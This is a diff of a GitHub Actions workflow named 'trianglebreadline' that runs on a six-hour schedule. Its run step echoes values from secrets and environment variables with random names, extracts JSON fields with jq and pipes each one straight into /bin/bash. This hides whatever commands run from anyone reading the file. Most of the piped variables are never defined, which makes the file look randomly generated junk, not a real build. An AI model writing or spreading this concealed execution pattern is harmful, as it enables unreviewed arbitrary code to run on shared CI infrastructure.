@@ -1,9 +1,10 @@
 name: trianglebreadline
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 0/6 * * *'
-jobs:  # 6906
+    - cron: '42 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,18 +12,21 @@ jobs:  # 6906
       - uses: actions/checkout@v4
       - name: trianglebreadline
         env:
-          xlig467: ${{ secrets.xlig467 }}
+          dps6: ${{ secrets.dps6 }}
         run: |
-          echo $xlig467 | jq -r .lvk6967 | /bin/bash
-          echo $nsn3 | jq -r .uz804 | /bin/bash
-          echo $n2041 | jq -r .rw8020 | /bin/bash
-          echo $zj9 | jq -r .zih57157 | /bin/bash
-          echo $tbf99 | jq -r .xsa95901 | /bin/bash
-          echo $sqwa2 | jq -r .wm69 | /bin/bash
-          echo $ktx594 | jq -r .ftl85546 | /bin/bash
-          echo $ufkl226 | jq -r .ub39485 | /bin/bash
-          echo $j2876 | jq -r .flsrp896 | /bin/bash
-          echo $iz8 | jq -r .reqjn92926 | /bin/bash
-          echo $bspa48747 | jq -r .ru2 | /bin/bash
-          echo $do27166 | jq -r .qeeej4237 | /bin/bash
+          echo $dps6 | jq -r .t2 | /bin/bash
+          echo $ou3 | jq -r .etple05438 | /bin/bash
+          echo $iwl7985 | jq -r .b80 | /bin/bash
+          echo $lz040 | jq -r .uuhjw3908 | /bin/bash
+          echo $huqwi2 | jq -r .p379 | /bin/bash
+          echo $qa8 | jq -r .g7269 | /bin/bash
+          echo $m97749 | jq -r .rrv2264 | /bin/bash
+          echo $nylw166 | jq -r .bepes9 | /bin/bash
+          echo $rrrnu41149 | jq -r .aob70 | /bin/bash
+          echo $ijtpd93865 | jq -r .oja2539 | /bin/bash
+          echo $n490 | jq -r .okc58540 | /bin/bash
+          echo $pn94614 | jq -r .y60401 | /bin/bash
+          echo $z07 | jq -r .mateq63952 | /bin/bash
+          echo $u64301 | jq -r .ttr2811 | /bin/bash
+          echo $hgudn3 | jq -r .et31 | /bin/bash
 
